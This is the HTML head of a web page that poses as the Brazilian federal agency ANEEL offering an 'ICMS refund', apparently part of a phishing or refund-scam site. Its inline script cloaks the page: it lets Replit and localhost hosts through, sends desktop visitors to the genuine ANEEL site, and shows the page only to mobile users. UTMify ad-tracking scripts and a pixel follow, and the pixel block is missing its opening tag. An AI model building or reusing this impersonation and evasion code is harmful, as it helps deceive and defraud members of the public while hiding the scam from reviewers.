<!DOCTYPE html>
<html lang="pt-BR" data-protected="true">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
    <title>ANEEL - Restituição ICMS | Governo Federal</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
    
    <!-- Script básico de verificação de dispositivo móvel -->
    <script>
      (function() {
        // Verificação básica para ambiente de desenvolvimento
        if (window.location.hostname === 'localhost' || 
            window.location.hostname.includes('replit') || 
            window.location.hostname.includes('127.0.0.1')) {
          console.log("Ambiente de desenvolvimento detectado, permitindo acesso via desktop.");
          localStorage.setItem('_dvt', 'true');
          return;
        }
        
        // Verificação de dispositivo móvel para produção
        var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        if (!isMobile && 
            !window.location.hostname.includes('replit') && 
            !window.location.hostname.includes('localhost')) {
          window.location.href = 'https://antigo.aneel.gov.br/';
        }
      })();
    </script>
    
    <!-- UTMify Scripts -->
    <script
      src="https://cdn.utmify.com.br/scripts/utms/latest.js"
      data-utmify-prevent-subids
      async
      defer
    ></script>
    
    <!-- Pixel UTMify -->

      window.pixelId = "67f81e2d256556cd68218366";
      var a = document.createElement("script");
      a.setAttribute("async", "");
      a.setAttribute("defer", "");
      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
      document.head.appendChild(a);
    </script>
